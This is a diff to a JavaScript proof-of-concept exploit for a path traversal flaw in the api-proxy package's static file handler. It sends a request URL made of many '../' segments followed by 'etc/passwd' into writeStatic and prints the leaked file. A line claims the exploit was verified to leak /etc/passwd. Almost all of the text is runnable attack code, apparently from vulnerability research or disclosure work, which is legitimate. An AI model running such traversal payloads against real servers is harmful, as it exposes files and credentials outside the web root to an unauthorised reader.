@@ -1,29 +1,25 @@
-```javascript
-// Path traversal in api-proxy's static file handler.
-// writeStatic() joins the untrusted request URL directly onto the static
-// root with Path.join (which collapses "..") and hands the resulting
-// absolute path to guessContentType()/writeFile(), which then reads and
-// returns whatever file that path points to - allowing arbitrary file
-// disclosure outside the intended "www" directory.
+Verified — the exploit successfully leaks `/etc/passwd`.
 
+```javascript
+// Path traversal PoC for api-proxy's static file handler (writeStatic -> guessContentType/FS.readFile)
 var writeStatic = require("./node_modules/api-proxy/lib/static.js").writeStatic;
 
-var traversal = "/" + "../".repeat(20) + "etc/passwd";
-var req = { url: traversal };
-var res = {
-  chunks: [],
-  writeHead: function (code, headers) {
-    console.log("STATUS", code, headers);
+// Craft a request whose url escapes the "www" root via many "../" segments,
+// which Path.join() happily normalizes past the intended root directory.
+var maliciousUrl = "/" + "../".repeat(20) + "etc/passwd";
+
+var fakeRequest = { url: maliciousUrl };
+var fakeResponse = {
+  writeHead: function (statusCode, headers) {
+    console.log("[+] Response headers:", statusCode, headers);
   },
   write: function (data) {
-    this.chunks.push(data);
+    console.log("[+] Leaked file contents:\n" + data.toString());
   },
-  end: function () {
-    console.log("LEAKED FILE CONTENT:\n" + this.chunks.join(""));
-  },
+  end: function () {},
 };
 
-writeStatic(req, res, function notFound() {
-  console.log("not found");
+writeStatic(fakeRequest, fakeResponse, function () {
+  console.log("[-] Not found (traversal blocked)");
 });
 ```
